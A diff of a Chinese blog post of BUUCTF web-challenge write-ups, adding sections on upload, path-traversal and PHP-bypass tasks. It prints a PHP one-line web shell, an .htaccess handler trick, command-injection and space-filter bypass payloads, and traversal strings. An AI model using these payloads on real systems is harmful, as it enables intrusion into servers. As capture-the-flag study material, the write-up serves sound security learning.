@@ -1,9 +1,9 @@
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="一、[极客大挑战 2019]EasySQL       题目是一个登录页面  首先考虑是否是SQL注入，通过查看网页源代码发现!  是php写的 于是直接在url后面输入 1&#x2F;check.php? username&#x3D;aa&amp;#x27;or&amp;#x27;a&amp;#x27;&#x3D;&amp;#x27;a&amp;&amp;password&#x3D;aa&amp;#x27;or&amp;#x27;a&amp;#x27">
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;550880247?utm_id&#x3D;0   &#x2F;&#x2F;SQL注入                     一、[极客大挑战 2019]EasySQL       题目是一个登录页面  首先考虑是否是SQL注入，通过查看网页源代码发现!  是php写的 于是直接在url后面输入 1&#x2F;check.php? username&#x3D;aa&amp;#x27;or&amp;#x2">
 <meta property="og:type" content="article">
 <meta property="og:title" content="陪AZ的WebBUU刷题(一)">
 <meta property="og:url" content="http://example.com/2022/01/06/BUU-1/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="一、[极客大挑战 2019]EasySQL       题目是一个登录页面  首先考虑是否是SQL注入，通过查看网页源代码发现!  是php写的 于是直接在url后面输入 1&#x2F;check.php? username&#x3D;aa&amp;#x27;or&amp;#x27;a&amp;#x27;&#x3D;&amp;#x27;a&amp;&amp;password&#x3D;aa&amp;#x27;or&amp;#x27;a&amp;#x27">
+<meta property="og:description" content="https:&#x2F;&#x2F;zhuanlan.zhihu.com&#x2F;p&#x2F;550880247?utm_id&#x3D;0   &#x2F;&#x2F;SQL注入                     一、[极客大挑战 2019]EasySQL       题目是一个登录页面  首先考虑是否是SQL注入，通过查看网页源代码发现!  是php写的 于是直接在url后面输入 1&#x2F;check.php? username&#x3D;aa&amp;#x27;or&amp;#x2">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281258184.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281257822.png">
@@ -61,8 +61,68 @@
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312125764.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221624.png">
 <meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221855.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457650.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457252.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457851.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457999.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171500511.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171505712.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506797.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506518.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171515429.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171517549.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171524639.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171530781.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171531922.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201511645.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201512570.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201514612.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201516206.png">
+<meta property="og:image" content="c:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20230920151948753.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521467.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521478.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525594.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525182.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527023.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527736.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112268.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112270.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021113080.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021120122.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021124961.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636859.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636196.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021638992.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021645883.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647276.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647760.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021649126.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021655354.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021715170.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021717742.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719956.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719570.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021722138.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021728962.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021738817.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031656440.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031659394.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031700323.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401031701777.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718311.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041718517.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041930727.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041951047.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041955252.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042000563.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401042001914.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401041958103.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051629835.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051631055.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051641173.png">
+<meta property="og:image" content="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401051654105.png">
 <meta property="article:published_time" content="2022-01-06T02:25:33.000Z">
-<meta property="article:modified_time" content="2022-07-31T14:21:55.742Z">
+<meta property="article:modified_time" content="2024-01-05T16:33:53.265Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="陪AZ的WebBUU刷题">
 <meta name="twitter:card" content="summary">
@@ -90,7 +150,8 @@ var CONFIG = {
   sourcePath: {"js":"js","css":"css","images":"images"},
 };
 
-window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">陪AZ的WebBUU刷题(一)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-07-31</span></span></div></header><div class="post-body">
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hexo</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">陪AZ的WebBUU刷题(一)</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2024-01-06</span></span></div></header><div class="post-body"><p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/550880247?utm_id=0" >https://zhuanlan.zhihu.com/p/550880247?utm_id=0</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>   //SQL注入</p>
+
         <h1 id="一、-极客大挑战-2019-EasySQL"   >
           <a href="#一、-极客大挑战-2019-EasySQL" class="heading-link"><i class="fas fa-link"></i></a><a href="#一、-极客大挑战-2019-EasySQL" class="headerlink" title="一、[极客大挑战 2019]EasySQL"></a>一、[极客大挑战 2019]EasySQL</h1>
       <p>题目是一个登录页面</p>
@@ -220,7 +281,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281546660.png" alt="image-20220728154658611"></p>
 <p>flag就来了 </p>
 <p>PS:</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping ;ls   打开当前根目录</span><br><span class="line">ping ;ls\  列出根目录\下的所有目录</span><br><span class="line">ping ;cat\ 打开\下的文件</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ping ;ls   打开当前根目录</span><br><span class="line">ping ;ls \  列出根目录\下的所有目录</span><br><span class="line">ping ;cat \ 打开\下的文件</span><br></pre></td></tr></table></div></figure>
 
 <p>附：ping命令</p>
 <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/m0_50317371/article/details/110489711" >https://blog.csdn.net/m0_50317371/article/details/110489711</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
@@ -264,7 +325,7 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207281628024.png" alt="image-20220728162829966"></p>
 <p>space表明网站对空格进行了过滤，应该想办法绕过空格，方法有：</p>
-<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></div></figure>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$IFS  //此题不行</span><br><span class="line">$&#123;IFS&#125;</span><br><span class="line">$IFS$1 //1改成加其他数字貌似都行</span><br><span class="line">&lt;</span><br><span class="line">&lt;&gt;</span><br><span class="line">&#123;cat,flag.php&#125; //用逗号实现了空格功能</span><br><span class="line">%20</span><br><span class="line">%09</span><br></pre></td></tr></table></div></figure>
 
 <p>于是我们尝试输入</p>
 <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?ip=;cat$IFS$1flag.php</span><br></pre></td></tr></table></div></figure>
@@ -359,6 +420,232 @@ window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></he
 <p>“GO”！</p>
 <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202207312221855.png" alt="image-20220731222150813"></p>
 <p>GO成功！</p>
+
+        <h1 id="十、-极客大挑战-2019-Upload-1"   >
+          <a href="#十、-极客大挑战-2019-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十、-极客大挑战-2019-Upload-1" class="headerlink" title="十、[极客大挑战 2019]Upload 1"></a>十、[极客大挑战 2019]Upload 1</h1>
+      <p>打开后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457650.png" alt="image-20230917144537665"></p>
+<p>提示我们上传图片文件，用记事本写一个一句话木马并将格式改为jpg</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457252.png" alt="image-20230917144725558"></p>
+<p>上传后提示我们</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457851.png" alt="image-20230917144756129"></p>
+<p>那就只能在记事本里改为：</p>
+<p><code>GIF89a</code></p>
+<p><code>&lt;script language=&#39;php&#39;&gt;@eval($_POST[shell]);&lt;/script&gt;</code></p>
+<p>重新上传后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171457999.png" alt="image-20230917145159795"></p>
+<p>说明我们成功绕过检测，抓包一下，更改文件后缀名为.phtml</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171500511.png" alt="image-20230917150048441"></p>
+<p>然后我们可以试着用蚁剑连接一下</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171505712.png" alt="image-20230917150525660"></p>
+<p>可以看到连接成功</p>
+<p>添加数据右键进入文件管理找flag（一般flag文件在根目录）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506797.png" alt="image-20230917150631727"></p>
+<p>点击flag即可拿到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171506518.png" alt="image-20230917150646459"></p>
+
+        <h1 id="十一、-ACTF2020-新生赛-Upload-1"   >
+          <a href="#十一、-ACTF2020-新生赛-Upload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十一、-ACTF2020-新生赛-Upload-1" class="headerlink" title="十一、[ACTF2020 新生赛]Upload 1"></a>十一、[ACTF2020 新生赛]Upload 1</h1>
+      <p>打开后鼠标移到灯泡那里会有上传提示</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171515429.png" alt="image-20230917151504289"></p>
+<p>选择上一题的test.jpg进行上传，然后抓包</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171517549.png" alt="image-20230917151747480"></p>
+<p>可以看到上传成功，文件后缀改成phtml再试试，也是成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171524639.png" alt="image-20230917152447561"></p>
+<p>尝试一下用蚁剑连接</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171530781.png" alt="image-20230917153003714">也是连接成功，同[极客大挑战 2019]Upload 1找到flag</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309171531922.png" alt="image-20230917153102858"></p>
+
+        <h1 id="十二、-GXYCTF2019-BabyUpload-1"   >
+          <a href="#十二、-GXYCTF2019-BabyUpload-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十二、-GXYCTF2019-BabyUpload-1" class="headerlink" title="十二、[GXYCTF2019]BabyUpload 1"></a>十二、[GXYCTF2019]BabyUpload 1</h1>
+      <p>依然是上传题</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201511645.png" alt="image-20230920151158606"></p>
+<p>试着上传test.jpg</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201512570.png" alt="image-20230920151233540"></p>
+<p>上传成功，我们抓包改一下文件后缀为phtml</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201514612.png" alt="image-20230920151451582"></p>
+<p>看来不太行</p>
+<p>但是这道题打开环境之前有个网站提示点进去查看exp.py文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201516206.png" alt="image-20230920151656161"></p>
+<p>上网查了一下发现是要先配置文件，得先上传.htaccess文件，并且内容为</p>
+<p><code>SetHandler application/x-httpd-php</code></p>
+<p><img src="C:/Users/86173/AppData/Roaming/Typora/typora-user-images/image-20230920151948753.png" alt="image-20230920151948753"></p>
+<p>没上传成功，抓包改一下“Content-Type”为image/jpeg</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521467.png" alt="image-20230920152129426"></p>
+<p>发现上传成功</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201521478.png" alt="image-20230920152157429"></p>
+<p>再将test.jpg上传</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525594.png" alt="image-20230920152514565"></p>
+<p>发现上传成功（在URL中去掉/var/www/html）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201525182.png" alt="image-20230920152551144"></p>
+<p>再到蚁剑连接</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527023.png" alt="image-20230920152721974"></p>
+<p>连接成功！</p>
+<p>添加数据后查看flag文件</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309201527736.png" alt="image-20230920152756697"></p>
+<p>OVER！</p>
+
+        <h1 id="十三、-MRCTF2020-你传你🐎呢-1"   >
+          <a href="#十三、-MRCTF2020-你传你🐎呢-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十三、-MRCTF2020-你传你🐎呢-1" class="headerlink" title="十三、[MRCTF2020]你传你🐎呢 1"></a>十三、[MRCTF2020]你传你🐎呢 1</h1>
+      <p>同 十二、[GXYCTF2019]BabyUpload 1</p>
+
+        <h1 id="十四、-HCTF-2018-WarmUp-1"   >
+          <a href="#十四、-HCTF-2018-WarmUp-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十四、-HCTF-2018-WarmUp-1" class="headerlink" title="十四、[HCTF 2018]WarmUp 1"></a>十四、[HCTF 2018]WarmUp 1</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112268.png" alt="image-20240102111212097"></p>
+<p>查看网页源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021112270.png" alt="image-20240102111240218"></p>
+<p>提示查看/source.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021113080.png" alt="image-20240102111323993"></p>
+<p>通过阅读代码可知</p>
+<p><code>highlight_file</code>函数显示当前文件的源代码，<code>__FILE__</code>是一个特殊的常量，表示当前文件的完整路径和文件名</p>
+<p>在emmm类中定义了一个公共的静态函数<code>checkFile</code>，它接受一个引用参数<code>$page</code></p>
+<p><code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code> 这行定义了一个名为<code>$whitelist</code>的数组，包含两个键值对，用于存储允许包含的文件名</p>
+<p>最后一个if语句判断检查HTTP请求中是否包含名为<code>file</code>的参数，且这个参数是否为字符串，并通过<code>checkFile</code>函数检查是否在白名单中</p>
+<p>先访问新的页面hint</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021120122.png" alt="image-20240102112052078"></p>
+<p>获取到了flag的文件名，以及每个字母重复四次在提示我们是在四层目录之下</p>
+<p>构造payload，包含名为file的参数</p>
+<p><code>?file=hint.php?../../../../../ffffllllaaaagggg</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021124961.png" alt="image-20240102112429922"></p>
+<p>得到flag</p>
+
+        <h1 id="十五、-极客大挑战-2019-BuyFlag-1"   >
+          <a href="#十五、-极客大挑战-2019-BuyFlag-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十五、-极客大挑战-2019-BuyFlag-1" class="headerlink" title="十五、[极客大挑战 2019]BuyFlag 1"></a>十五、[极客大挑战 2019]BuyFlag 1</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636859.png" alt="image-20240102163601647"></p>
+<p>查看右上角菜单可以看到有一个payflag，点进去之后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021636196.png" alt="image-20240102163658086"></p>
+<p>可以看到要想获得flag必须满足三个条件，①学生②正确的password③要有100000000的money</p>
+<p>查看网页源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021638992.png" alt="image-20240102163827958"></p>
+<p>提示表明要使用POST方法，password的值为404，但是又用了is_numeric()函数进行判断，表示密码不能仅仅是一个数字，但是又只使用了“==”，说明只是弱类型比较，添加随机字母才能使得参数等于数字</p>
+<p>所以先使用HackBar进行POST方法给password和money传参</p>
+<p><code>password=404a&amp;money=100000000</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021645883.png" alt="image-20240102164540845"></p>
+<p>EXECUTE后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647276.png" alt="image-20240102164732243"></p>
+<p>就差第一个条件了，再抓包</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021647760.png"></p>
+<p>看到Cookie那儿user（用户）的值为0，在计算机语言中，0通常为假，1通常为真，将user修改为1后发送</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021649126.png" alt="image-20240102164937096"></p>
+<p>又告诉我们数字长度太长了</p>
+
+        <h3 id="法Ⅰ：科学计数法"   >
+          <a href="#法Ⅰ：科学计数法" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：科学计数法" class="headerlink" title="法Ⅰ：科学计数法"></a>法Ⅰ：科学计数法</h3>
+      <p>使用科学计数法表示就能缩短长度了，100000000改为1e9（表示1后面有9个零，8个零会回显钱不够）</p>
+<p>发送之后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021655354.png" alt="image-20240102165532310"></p>
+<p>得到flag</p>
+
+        <h3 id="法Ⅱ：数组绕过"   >
+          <a href="#法Ⅱ：数组绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：数组绕过" class="headerlink" title="法Ⅱ：数组绕过"></a>法Ⅱ：数组绕过</h3>
+      <p>上网查查到这个方法，将<code>money=100000000</code>改为<code>money[]=0</code> (0可以为任何小于100000000的数字)</p>
+
+        <h1 id="十六、-BJDCTF2020-Easy-MD5-1"   >
+          <a href="#十六、-BJDCTF2020-Easy-MD5-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十六、-BJDCTF2020-Easy-MD5-1" class="headerlink" title="十六、[BJDCTF2020]Easy MD5 1"></a>十六、[BJDCTF2020]Easy MD5 1</h1>
+      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021715170.png"></p>
+<p>有点不知道怎么做，查看网页源代码也没啥发现，在题目打开界面有一个github链接，点击查看Web目录下的和url同名的文件leveldo4.php</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021717742.png" alt="image-20240102171756699"></p>
+<p>阅读代码，通过GET方法传入参数password的值为ffifdyop，则会跳转到新界面</p>
+<p>（也可以直接访问/levels91.php）</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719956.png" alt="image-20240102171930880"></p>
+<p>查看网页源代码</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021719570.png" alt="image-20240102171959537"></p>
+<p>阅读代码后可知，通过GET方法传入a和b，a和b值不同，但md5值相同</p>
+<p>（此处类似于[SWPUCTF 2021 新生赛]easy_md5）</p>
+<p>于是我们可以采用数组绕过（值都为NULL）或是科学计数法绕过</p>
+<p>构造payload</p>
+<p><code>/levels91.php?a[]=1&amp;b[]=2</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021722138.png" alt="image-20240102172204101"></p>
+<p>和刚刚的类似，两个参数值不同，但md5值相同，但是使用的是POST方法，得利用HackBar</p>
+<p>这里是用的强类型比较，即两个参数值和类型都得相同，再次使用数组绕过</p>
+<p>输入</p>
+<p><code>param1[]=0&amp;param2[]=1</code></p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021728962.png" alt="image-20240102172834916"></p>
+<p>EXECUTE后</p>
+<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401021738817.png" alt="image-20240102173809772"></p>
+<p>得到flag</p>
+
+        <h1 id="十七、-MRCTF2020-Ez-bypass-1"   >
+          <a href="#十七、-MRCTF2020-Ez-bypass-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#十七、-MRCTF2020-Ez-bypass-1" class="headerlink" title="十七、[MRCTF2020]Ez_bypass 1"></a>十七、[MRCTF2020]Ez_bypass 1</h1>
